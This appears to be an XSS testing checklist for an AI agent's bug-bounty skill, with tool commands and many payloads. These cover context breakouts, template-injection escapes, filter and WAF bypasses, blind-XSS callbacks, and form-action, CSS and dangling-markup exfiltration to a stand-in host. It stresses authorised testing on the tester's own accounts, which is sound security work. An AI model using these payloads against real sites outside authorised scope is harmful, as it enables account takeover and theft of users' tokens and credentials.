# Cross-Site Scripting (XSS): 60-Check Ledger

**Progress:** `[ 0 / 60 assessed ]`

Layout per check: **severity if vulnerable**, execution class(es), tags, subagent, objective, commands, pass/fail, references. XS-01…XS-40 are the core list; XS-41…XS-60 extend it from PortSwigger labs and research, OWASP WSTG, PayloadsAllTheThings, HackTricks and the community notes supplied with this skill (brutelogic, Gareth Heyes, Masato Kinugawa, s0md3v AwesomeXSS, terjanq Tiny-XSS-Payloads, zseano, nav1n0x, intigriti/Bugcrowd tips).

Variables: `$T` target origin · `$S` = `.agents/skills/xss/scripts` · `$E` = `artifacts/xss/evidence` · `$CB` your own blind-XSS host · `FUZZ` = injection point.
Classes: **R** reflect-proof (inert canary, no script) · **E** execute (alert(document.domain) in your own browser/accounts) · **S** stored (payload persisted where other users could see it) · **B** blind (callback to your own host from staff/back-office views) · **I** impact demo (cross-account, between your own accounts only). See SKILL.md.

Status: `PASS` · `FINDING` · `INFO` · `GATED` · `NOT_APPLICABLE` · `BLOCKED`.

Ground rules for every check:
- Proof payload is `alert(document.domain)` (or `print()` where alert is blocked). Never steal or display real users' cookies, tokens or data.
- Stored payloads: put them only in objects you own, in places other users cannot reach where possible (drafts, private profile, your own ticket). When a stored payload must be public to prove impact, make it inert-looking (`alert(document.domain)` on a click, not autofocus), record its URL and delete it after confirmation.
- Blind payloads: use only your own callback host. `probe.js` reports location, referrer, title and user agent only.
- No worms, no self-propagating payloads, no keyloggers, no phishing forms shown to real users, no defacement.

Reference shorthands:
- `PS-XSS` = `https://portswigger.net/web-security/cross-site-scripting`
- `PS-CTX` = `https://portswigger.net/web-security/cross-site-scripting/contexts`
- `PS-DOM` = `https://portswigger.net/web-security/cross-site-scripting/dom-based`
- `PS-DOMV` = `https://portswigger.net/web-security/dom-based`
- `PS-CSP` = `https://portswigger.net/web-security/cross-site-scripting/content-security-policy`
- `PS-DANG` = `https://portswigger.net/web-security/cross-site-scripting/dangling-markup`
- `PS-CS` = `https://portswigger.net/web-security/cross-site-scripting/cheat-sheet`
- `PS-CSTI` = `https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection`
- `PS-PP` = `https://portswigger.net/web-security/prototype-pollution`
- `WSTG-RXSS` = `https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting`
- `WSTG-SXSS` = `https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting`
- `WSTG-DOM` = `https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting`
- `WSTG-CLIENT` = `https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/` (HTML injection, client-side URL redirect, CSS injection, web messaging, XSSI)
- `OWASP-CS` = `https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html`
- `OWASP-EVASION` = `https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html`
- `PATT` = `https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection`
- `CWE-79` = `https://cwe.mitre.org/data/definitions/79.html`

---

## XS-A — Reflection Surfaces

### XS-01 · Reflected XSS in all URL parameters (basic payloads) — `HIGH` · R/E
Tags: `reflected` `url-param` · Subagent: XS-A

Send an inert canary to every parameter (including ones you add from `wordlists/params.txt` / Arjun / x8). The canary finds reflections. The second request shows which characters survive in each context. Only then send a matching payload.

```bash
python3 -I $S/xss_reflect.py --target example.com --url "$T/search?q=x&page=1&sort=new" --all-params
python3 -I $S/xss_payloads.py --context html --allowed '<>"/= ()'
dalfox url "$T/search?q=x" --skip-bav --only-poc r --delay 500      # optional confirmation, scope-checked target only
```
- **Fail:** script executes (`alert(document.domain)` shows the target origin). **Pass:** every reflection encoded for its context.
- **Refs:** `PS-XSS` (reflected labs) · `WSTG-RXSS` · `OWASP-CS`

### XS-04 · URL parameters reflected in page content (all occurrences) — `HIGH` · R/E
Tags: `reflected` `multi-context` · Subagent: XS-A

One value is often reflected several times in different contexts (title, meta, hidden input, JS variable, canonical link). `xss_reflect.py` lists each occurrence separately. Exploit the weakest. Include cookie banners and third-party widgets on the page: their code often reflects the full URL unencoded (leave the banner undismissed while testing).
- **Refs:** `PS-CTX` · `WSTG-RXSS`

### XS-05 · HTTP headers reflected in the response (User-Agent, Referer, X-Forwarded-*) — `MEDIUM` · R/E/B
Tags: `headers` `user-agent` · Subagent: XS-A

Reflected header XSS is usually only exploitable with a cache (XS-57) or when an admin view renders it later (blind, XS-28). Test `User-Agent`, `Referer`, `X-Forwarded-For`, `X-Forwarded-Host`, `Accept-Language`, custom headers.

```bash
python3 -I $S/xss_reflect.py --target example.com --url "$T/" --header 'User-Agent: FUZZ'
python3 -I $S/xss_reflect.py --target example.com --url "$T/contact" --header 'User-Agent: FUZZ' --follow-url "$T/account/requests"
```
- **Refs:** `PATT` · intigriti tip: blind payload in User-Agent before submitting a contact form

### XS-06 · File upload filenames displayed on the page — `HIGH` · S/E
Tags: `upload` `filename` · Subagent: XS-A

Change the multipart `filename=` in Burp: `"><img src=x onerror=alert(document.domain)>.png`. Also put the payload only in the **extension** (`bbx.<svg onload=...>`): filename validation often forgets the extension. Check the upload list, previews, notification emails and admin views.

```bash
python3 -I $S/xss_files.py --out artifacts/xss/files && cat artifacts/xss/files/filenames.txt
```
- **Refs:** `PS-XSS` (file upload) · community tip: payload in file extension

### XS-18 · Error messages that reflect user input — `MEDIUM` · R/E
Tags: `error-page` `404` · Subagent: XS-A

404 pages that echo the path, validation errors echoing the field, "invalid parameter X" messages, framework debug pages, custom HTTP status text (`HTTP/1.0 999 <img src=x onerror=...>` when the status message is user-controlled).
- **Refs:** `PATT` · Frans Rosén (status-line reflection)

### XS-41 · Context mapping and character survival — `—` · R
Tags: `reflector` `analysis` · Subagent: XS-A

Required before payloads. For each reflection: context (HTML text, quoted/unquoted attribute, URL attribute, event handler, JS string/template/block, comment, RCDATA like `<textarea>`/`<title>`, style, non-HTML) and the raw characters. `xss_reflect.py` does both and ranks payloads that fit. Burp extensions Reflector / Reflected Parameters do the same passively.
- **Refs:** `PS-CTX` · elkokc/reflector

### XS-42 · Attribute contexts: unquoted, hidden inputs, accesskey/click gadgets — `HIGH` · E
Tags: `attribute` `hidden-input` · Subagent: XS-A

Unquoted value: a space breaks out (`x onfocus=alert(document.domain) autofocus`), even through `htmlspecialchars`. Quoted value with `"` raw: `" autofocus onfocus=alert(document.domain) x="`. `type=hidden`: add `type=text` before `autofocus` if the type attribute comes after your injection. Otherwise use `accesskey=x onclick=...` (needs a keypress) or set `id=` to an element the page's JS clicks (`document.getElementById('x').click()`). `<link rel=canonical href='...'>`: `accesskey` + `onclick`.
- **Refs:** `PS-CTX` (labs: attribute with angle brackets encoded, canonical link tag) · Gareth Heyes hidden-input research · community tips

### XS-43 · JavaScript string and script-block breakouts — `HIGH` · E
Tags: `js-context` · Subagent: XS-A

In a JS string: `'-alert(document.domain)-'`, `';alert(document.domain)//`, `\';alert(document.domain)//` (backslash not escaped), `'^alert()^'`, `'/alert()/'`. `</script><svg onload=...>` always works if `<` survives, because the HTML parser ends the script first. In a template literal: `${alert(document.domain)}`. Inside `onclick="..."` attributes HTML entities are decoded first (`&apos;-alert(document.domain)-&apos;`).
- **Refs:** `PS-CTX` (labs: JS string, angle brackets HTML-encoded; single quote and backslash escaped; template literal; onclick with entities) · `PATT`

### XS-53 · Path-based reflection (PATH_INFO, `;` path parameters, routes) — `HIGH` · R/E
Tags: `path` `jsp` `routing` · Subagent: XS-A

Reflection of the path in links, canonical tags, breadcrumbs and 404 pages: `/page.php/"><svg onload=...>`, Tomcat/Java path parameters `/test.jsp;');alert(1)//`, SPA routes, appended extensions (`/api/user` → `/api/user.html?x=<payload>`).
- **Refs:** community tips (Tomcat `;` path parameters, `.html` extension on JSON endpoints) · `PATT`

### XS-54 · Split payloads and length-limited inputs — `MEDIUM` · S/E
Tags: `split` `length-limit` · Subagent: XS-A

Two fields rendered next to each other: first name `<img src=x `, last name `onerror=alert(document.domain)>`, or a comment to join them (`<svg/onload=alert(1)/*` … `*/>`). Short-payload references: terjanq Tiny-XSS-Payloads, `<svg/onload=eval(name)>` with `window.name` set by your own opener page.
- **Refs:** brutelogic "XSS in limited input formats" · terjanq/Tiny-XSS-Payloads

### XS-55 · Unexpected fields: numeric IDs, order IDs, cookies, locale, consent banners — `MEDIUM` · R/E
Tags: `numeric-field` `cookie` · Subagent: XS-A

Parameters meant to be numbers (order ID, invoice, page, quantity) are often not encoded. Same for `lang=`, `color=`, `language=`, `redirect_url=`, cookie values reflected into the page (`Cookie: lang="><svg ...>`; exploitable with cookie injection or tossing). Also widgets and consent banners that reflect `location.href`.
- **Refs:** community tips (order ID XSS, `?color=`, `?language=`, cookie-banner reflection)

### XS-56 · Device, user-agent and locale variants — `MEDIUM` · R/E
Tags: `mobile` `amp` `locale` · Subagent: XS-A

Mobile/AMP/legacy templates, other language versions, and print views often use different, older encoding. Repeat XS-01 with a mobile `User-Agent`, `?amp=1`, `/m/`, other locales, and UTF-16/UTF-8 charset variants.
- **Refs:** community tip (mobile homepage, UTF-16 username)

---

## XS-B — Stored, Blind & Rendering Pipelines

### XS-02 · Stored XSS in user-generated content (comments, posts) — `HIGH–CRITICAL` · S/E
Tags: `stored` · Subagent: XS-B

Comments, posts, reviews, profile fields (name, bio, website, company), ticket subjects, chat messages, product questions, display names shown to others. Submit the canary first and find every page that displays it (`--follow-url`), including admin views and notifications. Then test with one payload per context.

```bash
python3 -I $S/xss_reflect.py --target example.com --url "$T/api/profile" --data 'bio=FUZZ' --follow-url "$T/u/myhandle"
```
- **Fail:** script runs for another of your own accounts viewing the content. **Refs:** `PS-XSS` (stored labs) · `WSTG-SXSS`

### XS-07 · SVG file uploads with embedded JavaScript — `HIGH` · S/E
Tags: `svg` `upload` · Subagent: XS-B

Upload `svg_onload.svg`, `svg_script.svg`, `svg_animate.svg`, `svg_foreignobject.svg`. Script runs only when the SVG is opened as a document from the target origin (direct URL, `<object>`, `<iframe>`), not via `<img>`. Note `Content-Type`, `Content-Disposition: attachment`, a sandbox domain or CSP that would stop it.

```bash
python3 -I $S/xss_files.py --out artifacts/xss/files
```
- **Refs:** `PATT` (XSS in files) · `PS-XSS`

### XS-08 · Markdown / HTML rendering and WYSIWYG bypass — `HIGH` · S/E
Tags: `markdown` `wysiwyg` `rich-text` · Subagent: XS-B

Markdown links `[x](javascript:...)`, reference links, image titles breaking out (`![x](x"onerror="...)`), raw HTML passthrough, code-fence escapes. WYSIWYG editors often sanitise on the client only, so send the raw HTML request in Burp. `markdown.md` contains the vectors.
- **Refs:** `PATT` (Markdown) · `OWASP-CS` (HTML sanitisation)

### XS-09 · SSTI leading to XSS — `HIGH–CRITICAL` · E
Tags: `ssti` `template` · Subagent: XS-B

`{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}` rendering `49` server-side means template injection. Report it as SSTI (potential RCE) through the SSTI skill when available. Here, prove only the XSS consequence. The triage string `'"><svg/onload=alert(document.domain)>{{7*7}}` covers SQLi, XSS and template injection at once.
- **Refs:** `https://portswigger.net/web-security/server-side-template-injection` · nav1n0x combined triage tip

### XS-27 · HTML emails rendered by the application — `MEDIUM` · S/B
Tags: `email` `notification` · Subagent: XS-B

Values you control (name, ticket subject, invite message) placed into HTML emails, in-app mailboxes or "view in browser" links. Webmail clients strip scripts, but the app's own web view of the email may not. Use your own mailbox and a second own account as recipient.
- **Refs:** `PATT` · `WSTG-SXSS`

### XS-28 · Blind XSS via your own callback service — `HIGH–CRITICAL` · B
Tags: `blind` `admin-panel` `callback` · Subagent: XS-B

Put blind payloads (unique label per field) into fields staff will view: contact and support forms, feedback, signup data in admin user lists, order notes, User-Agent/Referer logged into dashboards, error reports, chat transcripts. Host `probe.js` on your own server. Do not use public collectors or IDs copied from notes. Wait days. Hits from third-party SaaS consoles (helpdesk, review analytics) are only in scope if the program says so. Otherwise stop and report the hit to the program without exploring it further.

```bash
python3 -I $S/xss_files.py --out artifacts/xss/files --callback https://bx.YOUR-DOMAIN
python3 -I $S/bxss_listener.py --dir artifacts/xss/files --port 8000 --bind 127.0.0.1   # behind your own TLS proxy
```
- **Fail:** callback from an internal/admin URL. **Refs:** ardern.io blind XSS payloads · self-hosted XSS Hunter / interactsh · `PATT` (blind XSS)

### XS-29 · Self-XSS chained with other bugs — `MEDIUM–HIGH` · E/I
Tags: `self-xss` `chaining` · Subagent: XS-B

Self-XSS on its own is out of scope for most programs. Possible chains:
- Login or logout CSRF that logs the victim into your account holding the payload.
- CSRF on the vulnerable field.
- Cache poisoning (XS-57).
- OAuth or social login linking.
- Copy-paste gadgets.
- `postMessage` (XS-48).
- Sharing or collaboration features that move your content into another user's view.

Demonstrate the chain between your own two accounts only.
- **Refs:** Ch3ckM4te "Self-XSS to account takeover" · geekboy "Airbnb – turning self-XSS into good XSS" · shawarkhan "Exploiting multiple self-XSSes"

### XS-30 · PDF generation endpoints that render HTML — `HIGH` · E
Tags: `pdf` `headless` · Subagent: XS-B

Invoices, reports, exports and "save as PDF" built with wkhtmltopdf, headless Chrome, PhantomJS or Prince. `pdf_render.html` proves JavaScript runs in the renderer and shows its location and user agent. Reading `file://` or internal URLs from the renderer is SSRF or local file read: hand off to `ssrf-audit` / `path-traversal` (gated classes).
- **Refs:** Samuel Anttila PDF XSS threads · `PATT` (XSS in PDF generators) · `ssrf-audit`

### XS-57 · Web cache poisoning / deception to stored XSS — `HIGH–CRITICAL` · E/S
Tags: `cache` `unkeyed-header` · Subagent: XS-B

Reflected XSS in an **unkeyed** header or parameter (`X-Forwarded-Host`, `X-Original-URL`, UTM params, fat GET) plus a shared cache equals stored XSS for every visitor. Use a cache buster (`?cb=bbx<rand>`) so only your own cache key is poisoned. Never poison the real key of a live page.
- **Refs:** `https://portswigger.net/web-security/web-cache-poisoning` · Param Miner

---

## XS-C — DOM, Frameworks & Cross-Origin

### XS-03 · DOM-based XSS in client-side JavaScript — `HIGH` · R/E
Tags: `dom` `source-sink` · Subagent: XS-C

Sources: `location.*`, `document.referrer`, `window.name`, `postMessage`, storage, `URLSearchParams`. Sinks: `innerHTML`, `document.write`, `eval`, jQuery `html()`/`$()`, `location`, `src`/`href` attributes, `srcdoc`. Triage statically, then confirm in Burp's browser with DOM Invader (canary injection, sink tracking).

```bash
python3 -I $S/dom_sinks.py artifacts/js/ --min-score 2      # bundles downloaded by jsrecon
```
- **Refs:** `PS-DOM` (labs: document.write, innerHTML, jQuery href / $() hashchange, AngularJS) · `WSTG-DOM` · DOM Invader

### XS-17 · JSON responses rendered as HTML / JSON injection — `MEDIUM–HIGH` · E
Tags: `json` `content-type` · Subagent: XS-C

A JSON body served as `text/html` (or without `nosniff`) that reflects input runs as a page. JSON values later inserted into the DOM (`innerHTML` of an API field) are DOM or stored XSS. Also check `<script>var data = {...}</script>` server-side JSON embedding: `</script>` inside a string breaks out unless `<` is escaped as `<`.
- **Refs:** community tip (JSON with text/html) · `OWASP-CS` (safe JSON embedding)

### XS-23 · AngularJS sandbox escape / CSTI — `HIGH` · E
Tags: `angularjs` `csti` · Subagent: XS-C

Pages with `ng-app` render `{{...}}` from the HTML. `{{7*7}}` → `49` confirms. Version-specific escapes:
- 1.6 and later (no sandbox): `{{constructor.constructor('alert(document.domain)')()}}`
- Older versions: `$on.constructor`, `'a'.constructor.prototype.charAt=[].join` variants

```bash
python3 -I $S/xss_payloads.py --context html --families csti
```
- **Refs:** `PS-CSTI` (labs: AngularJS expression, sandbox escape, CSP bypass) · Gareth Heyes AngularJS sandbox research

### XS-24 · Vue.js template injection — `HIGH` · E
Tags: `vue` `csti` · Subagent: XS-C

Server-rendered content inside a Vue-mounted element is compiled as a template: `{{_c.constructor('alert(document.domain)')()}}` (Vue 2), `{{this.constructor.constructor('alert(document.domain)')()}}`. `v-html` bound to user data is direct HTML injection.
- **Refs:** PortSwigger research "Evading defences using VueJS script gadgets" · `PATT` (CSTI)

### XS-25 · React `dangerouslySetInnerHTML` and other framework escape hatches — `HIGH` · E
Tags: `react` `angular` `svelte` · Subagent: XS-C

The dangerous APIs are:
- React: `dangerouslySetInnerHTML`, and `href={userUrl}` (React warns about but still renders `javascript:` URLs in older versions)
- Angular: `bypassSecurityTrust*`
- Svelte: `{@html}`
- Lit: `unsafeHTML`
- Handlebars: triple-stash
- Server-side rendering with unescaped state

`dom_sinks.py` flags all of these. Trace whether user data reaches them.
- **Refs:** React/Angular security docs · `OWASP-CS` (framework sections)

### XS-26 · Mutation XSS (mXSS) and sanitizer bypass — `HIGH` · E
Tags: `mxss` `dompurify` `sanitizer` · Subagent: XS-C

Sanitised HTML that the browser re-parses differently, through namespace confusion (`<math>`/`<svg>` with `<style>`/`<mglyph>`), `<noscript>`, `<xmp>`, or nested forms. Identify the sanitizer and its version: DOMPurify < 2.0.1 / 2.2.2 / 3.1.3 had public bypasses, as did sanitize-html, Bleach, OWASP Java HTML Sanitizer and custom regex sanitizers.

```bash
python3 -I $S/xss_payloads.py --context html --families mxss
```
- **Refs:** Michał Bentkowski / Securitum DOMPurify mXSS research · Masato Kinugawa · `PATT` (mXSS)

### XS-33 · JavaScript template literals — `HIGH` · E
Tags: `template-literal` · Subagent: XS-C

Reflection inside backticks: `${alert(document.domain)}` with no quote needed. Also tagged-template calls without parentheses (`alert\`1\``) when `(`/`)` are filtered.
- **Refs:** `PS-CTX` (lab: reflected into a template literal) · `PATT`

### XS-48 · `postMessage` DOM XSS — `HIGH` · E
Tags: `postmessage` `web-messaging` · Subagent: XS-C

Listeners that write `event.data` into a sink without checking `event.origin` (or with weak `indexOf`/`startsWith` checks). Exploit from your own page by framing the target or using `window.open`. Also check senders using `targetOrigin '*'` with sensitive data.
- **Refs:** `PS-DOMV` (web messages labs) · `WSTG-CLIENT` (Testing Web Messaging)

### XS-49 · DOM clobbering — `MEDIUM–HIGH` · E
Tags: `dom-clobbering` · Subagent: XS-C

When only sanitised HTML (`id`/`name` allowed) can be injected, clobber globals the code reads (`window.config || {}`), for example `<a id=config><a id=config name=url href=//YOUR.HOST/x.js>`. This works well against DOMPurify-protected pages.
- **Refs:** `PS-DOMV` (DOM clobbering labs) · Gareth Heyes DOM clobbering research

### XS-50 · Client-side prototype pollution to XSS gadgets — `HIGH` · E
Tags: `prototype-pollution` · Subagent: XS-C

`?__proto__[x]=y` / `#constructor[prototype][x]=y` polluting `Object.prototype` via vulnerable merge/query parsers, then a gadget (e.g. `transport_url`, jQuery `$.html` options, sanitizer config) sends it to a sink. DOM Invader finds both sources and gadgets.
- **Refs:** `PS-PP` (client-side labs) · BlackFan client-side-prototype-pollution gadget list

### XS-51 · XSSI / JSONP data leakage — `MEDIUM–HIGH` · I
Tags: `xssi` `jsonp` · Subagent: XS-C

The rule bypassed is the same-origin policy, since `<script src>` loads across origins. Look for:
- dynamic JS (differs with and without session)
- JSONP callbacks
- JSON arrays or JS files carrying user data without an anti-XSSI prefix

Prove leakage with your own session only.

```bash
python3 -I $S/xssi_check.py --target example.com --urls artifacts/xss/js_endpoints.txt --auth-header 'Cookie: session=YOURS'
```
- **Refs:** `WSTG-CLIENT` (Testing for Cross Site Script Inclusion) · HackTricks XSSI · HackerOne #207266 and disclosed XSSI/JSONP reports (Coinbase, Liberapay, Instagram OAuth) · Burp DetectDynamicJS

### XS-59 · Vulnerable client libraries and known framework XSS — `MEDIUM–HIGH` · E
Tags: `jquery` `swagger-ui` `cve` · Subagent: XS-C

Known-vulnerable client code:
- jQuery < 3.5 `htmlPrefilter` and older `$(location.hash)` behaviour
- jQuery UI dialog/tooltip
- Bootstrap < 3.4.1/4.3.1 `data-*` tooltips
- AngularJS 1.x (end of life)
- Swagger UI `?url=`/`?configUrl=` (old DOMPurify)
- Prototype.js, Handlebars, Lodash template

Confirm the vulnerable code path is reachable, not just the version.
- **Refs:** Retire.js · `jsrecon` · Swagger UI CVE-2021-46708 class

---

## XS-D — Element & Event Vectors

### XS-10 · Event handlers (onerror, onload, onclick, onmouseover, and others) — `HIGH` · E
Tags: `event-handlers` · Subagent: XS-D

Prefer handlers that need no interaction: `onerror`, `onload`, `ontoggle` with `open`, `onfocus` with `autofocus`, `onanimationstart`, `onbegin`/`onend` (SVG), `onstart` (marquee). Use the PortSwigger cheat sheet to find tag/event pairs that pass a blocklist (Burp Intruder: tags first, then events).
- **Refs:** `PS-CS` · `PS-XSS` (lab: most tags and attributes blocked)

### XS-13 · SVG/XML content types and namespace confusion — `HIGH` · S/E
Tags: `xml` `xhtml` `namespace` · Subagent: XS-D

Files served as `image/svg+xml`, `text/xml`, `application/xhtml+xml` execute scripts from the HTML namespace (`<html:script>`). Upload or reflect `xml_html_ns.xml` / `page.xhtml`. Inline `<svg>` inside HTML is parsed as foreign content, which changes how `<style>` and comments behave (mXSS, XS-26).
- **Refs:** community tip (XSS from an XML file) · `PATT`

### XS-19 · iframe `srcdoc` injection — `HIGH` · E
Tags: `iframe` `srcdoc` · Subagent: XS-D

`<iframe srcdoc="&lt;script&gt;parent.alert(document.domain)&lt;/script&gt;">` uses entities inside `srcdoc`, which defeats filters looking for `<script`. Note that `srcdoc` frames inherit the parent's origin and CSP.
- **Refs:** `PATT` · HTML spec (srcdoc)

### XS-32 · MathML injection — `MEDIUM–HIGH` · E
Tags: `mathml` · Subagent: XS-D

`<math><x xlink:href=javascript:...>` (Firefox), `<math href=javascript:...>`, plus MathML-based mXSS (`<math><mtext><table><mglyph><style>`).
- **Refs:** `PS-CS` (MathML section) · `PATT`

### XS-35 · `<object data=...>` — `MEDIUM` · E
Tags: `object` · Subagent: XS-D

`<object data="javascript:alert(document.domain)">` (legacy), `<object data="data:text/html,...">` (opaque origin, so lower impact), `<object data=//YOUR.HOST/x.svg>` loading an SVG document. Blocked by `object-src 'none'`.
- **Refs:** `PATT` · `PS-CS`

### XS-36 · `<embed src=...>` — `MEDIUM` · E
Tags: `embed` · Subagent: XS-D

`<embed src="data:image/svg+xml;base64,...">`, `<embed src=javascript:...>` (legacy browsers). Same `object-src` rule.
- **Refs:** `PATT`

### XS-39 · SVG `<animate>` / `<set>` elements — `HIGH` · E
Tags: `svg-animation` · Subagent: XS-D

`<svg><animate onbegin=alert(document.domain) attributeName=x dur=1s>`, `<animate onend=...>`, `<set attributeName=onmouseover to=alert(1)>`, and animating `href` to `javascript:` on `<a>`. These bypass filters that only know `onload`/`onerror`.
- **Refs:** `PS-CS` (lab: some SVG markup allowed) · community final payload `<svg><animate onend=alert(1) dur=1s>`

### XS-40 · HTML5 `autofocus` (+ onfocus) — `HIGH` · E
Tags: `autofocus` · Subagent: XS-D

`<input onfocus=alert(document.domain) autofocus>`, and in attribute contexts `" autofocus onfocus=... x="`. If `(`/`)` are filtered: `"onfocus="alert\`1\`"autofocus="`. If WAFs strip `focus`, use recursive keyword stripping: `onffocusofocuscfocusufocuss`.
- **Refs:** zseano recursive-strip tip · community autofocus tips

---

## XS-E — URL, Navigation & Scriptless Vectors

### XS-11 · `javascript:` pseudo-protocol — `HIGH` · E
Tags: `javascript-uri` · Subagent: XS-E

Any user URL placed in `href`, `src` (iframe), `action`, `formaction`, `location`. Bypass variants:
- case changes
- tab, newline or other control characters (`java%0ascript:`, `\x01javascript:`)
- entity-encoded letters (`&#106;avascript:`)
- `javascript://%0aalert(document.domain)`, where `//` comments out the rest so the URL looks valid

```bash
python3 -I $S/xss_payloads.py --context url-attr
```
- **Refs:** `PS-CTX` (lab: href attribute with double quotes encoded) · `PATT`

### XS-12 · `data:` URI scheme — `MEDIUM` · E
Tags: `data-uri` · Subagent: XS-E

`data:text/html,<script>...</script>` in iframes or links. Top-level navigation to `data:` is blocked in modern browsers and frames have an opaque origin, so impact is usually low. `data:` in `script-src` allowed by CSP (`<script src=data:,alert(document.domain)>`) is a full bypass.
- **Refs:** `PATT` · `PS-CSP`

### XS-20 · `<base>` tag injection to hijack relative URLs — `HIGH` · E
Tags: `base-tag` · Subagent: XS-E

`<base href=//YOUR.HOST/>` placed before relative `<script src="js/app.js">` loads your script. It also redirects relative links and forms. CSP `base-uri` blocks it.
- **Refs:** `PS-DANG` · community tip (`<base href>` when space is tight) · `csp_analyze.py`

### XS-21 · Form `action` injection to steal credentials — `HIGH` · E/I
Tags: `form-hijack` `scriptless` · Subagent: XS-E

Inject `<form action=//YOUR.HOST>` around existing inputs, or `formaction` on a button, so browser-autofilled passwords or CSRF tokens post to you. Demonstrate with your own account and dummy values only. CSP `form-action` blocks it.
- **Refs:** `PS-DANG` · `WSTG-CLIENT` (HTML injection)

### XS-22 · Meta refresh redirect — `MEDIUM` · E
Tags: `meta-refresh` · Subagent: XS-E

`<meta http-equiv="refresh" content="0;url=https://YOUR.HOST/">` makes HTML injection into an open redirect. `content="0;url=javascript:..."` is blocked in modern browsers. A meta CSP injected into `<head>` can also disable page scripts (DoS) or weaken the policy.
- **Refs:** community tips (meta refresh to escalate HTML injection; meta CSP)

### XS-34 · `href` with `javascript:` (link contexts) — `HIGH` · E
Tags: `href` · Subagent: XS-E

Profile website, "back"/"return" links, social links, `redirect_url` rendered as a link. Check whether validation only checks the prefix (`https://` inside a query string, `javascript:alert(1)//https://`), or happens client-side only.
- **Refs:** `PS-CTX` · community tip (`?redirect_url=javascript:alert()`)

### XS-37 · Event handler or expression in a `style` attribute — `MEDIUM` · E
Tags: `style-attr` · Subagent: XS-E

Injection into `style="..."`: break out with `"` to add `onmouseover`, or use `animation-name` with `onanimationstart`. `expression()` only works in IE ≤ 7 (XS-16). `behavior:url()` is IE only.
- **Refs:** `PATT` · `WSTG-CLIENT` (CSS injection)

### XS-38 · CSS `@import` / CSS injection — `MEDIUM` · E/I
Tags: `css-injection` · Subagent: XS-E

Injected CSS (`<style>`, style attributes, theme or color settings) can `@import` attacker CSS. Attribute selectors (`input[value^=a]{background:url(//YOUR.HOST/a)}`) leak CSRF tokens character by character. Demonstrate only against your own account's token.
- **Refs:** `WSTG-CLIENT` (Testing for CSS Injection) · PortSwigger research (blind CSS exfiltration)

### XS-47 · Redirect parameters to `javascript:` (open redirect to XSS) — `HIGH` · E
Tags: `open-redirect` · Subagent: XS-E

Client-side redirects (`location = params.get('next')`) accept `javascript:`. Server-side 3xx do not. Try:
- `javascript://%0aalert(document.domain)`
- `javascript://%250aalert(1)` (double decode)
- `/x:1/:///%01javascript:alert(document.cookie)/`
- `javascript:alert(1)//https://allowed.example`
- **Refs:** `WSTG-CLIENT` (Client-side URL Redirect) · community tips (kunalp94)

### XS-58 · Dangling markup and scriptless injection — `MEDIUM` · E/I
Tags: `dangling-markup` `scriptless` · Subagent: XS-E

When scripts are blocked by CSP or a sanitizer but HTML gets through: `<img src='//YOUR.HOST/?` captures the following markup (CSRF tokens) until the next quote. Variants use `<a ping>`, `<link rel=prefetch>`, and `<meta>`. Only demonstrate with your own data.
- **Refs:** `PS-DANG` (lab: reflected XSS protected by very strict CSP, with dangling markup attack) · `PS-CSP`

---

## XS-F — Bypass, CSP & Impact

Check the program rules: some programs forbid WAF-evasion testing or automated scanners.

### XS-14 · HTML entity encoding bypass — `MEDIUM` · E
Tags: `entities` · Subagent: XS-F

Entities are decoded inside attribute values and event handlers before JavaScript runs: `<svg onload=&#97;&#108;&#101;&#114;&#116;(1)>`, `<SVG ONLOAD=&#97&#108&#101&#114&#116(1)>` (semicolons optional), `&NewLine;`/`&Tab;` inside `javascript:` URLs, and `&apos;` to break out of `onclick` strings.
- **Refs:** `OWASP-EVASION` · brutelogic uppercase entity payload

### XS-15 · Unicode encoding variations — `MEDIUM` · E
Tags: `unicode` · Subagent: XS-F

JavaScript escapes in identifiers (`alert`), `\x` escapes in strings with `eval`, full-width characters normalised server-side (`＜` U+FF1C → `<` after NFKC), IIS `%u003c`, and overlong UTF-8 on legacy stacks.
- **Refs:** `OWASP-EVASION` · `PATT` (filter bypass)

### XS-16 · CSS `expression()` for old IE — `LOW` · E
Tags: `legacy-ie` · Subagent: XS-F

`x:expression(alert(1))` only works in IE ≤ 7 or in IE compatibility mode (`X-UA-Compatible: IE=7`, intranet zone). Report only if the program supports such clients; otherwise `NOT_APPLICABLE`.
- **Refs:** `OWASP-EVASION`

### XS-31 · Charset tricks (UTF-7, UTF-16) — `MEDIUM` · E
Tags: `charset` `utf-7` · Subagent: XS-F

Missing `charset` in `Content-Type` and an injectable `<meta charset>`, or a user-controlled `charset=` parameter. Then UTF-7 (`+ADw-script+AD4-`, legacy), UTF-16 (null-interleaved bytes passing ASCII filters), ISO-2022-JP escape sequences (Chrome: switching charset hides backslashes).
- **Refs:** Sonar research "Encoding differentials: why charset matters" (ISO-2022-JP) · community tip (UTF-16 username)

### XS-44 · Sanitizer / filter logic bypass — `HIGH` · E
Tags: `filter-bypass` · Subagent: XS-F

Probe how the filter works, one feature at a time:
- **Non-recursive stripping:** `<scr<script>ipt>`, `ononmouseover=mouseover=`.
- **Unclosed tags:** `<img src=x onerror=alert(1)//`, `<svg onload=alert(1) ` with no `>`.
- **Separators in tags:** `%0a`, `%0c`, `%09`, `/`, as in `<script%0a>` and `<svg/onload>`.
- **Comment wrapping:** `<!----><script>`, and `--!>` to close a comment.
- **Double `<`:** `<<img ...>`.
- **Backtick attribute values:** `` src=`x` ``.
- **Duplicate attributes and quote juggling:** `<img ="=" title="><img src=1 onerror=alert(1)>">`.
- **Keyword strip-to-null:** `onffocusofocuscfocusufocuss`.
- **Refs:** `OWASP-EVASION` · community payload list · `PATT`

### XS-45 · WAF bypass payload classes — `MEDIUM–HIGH` · E
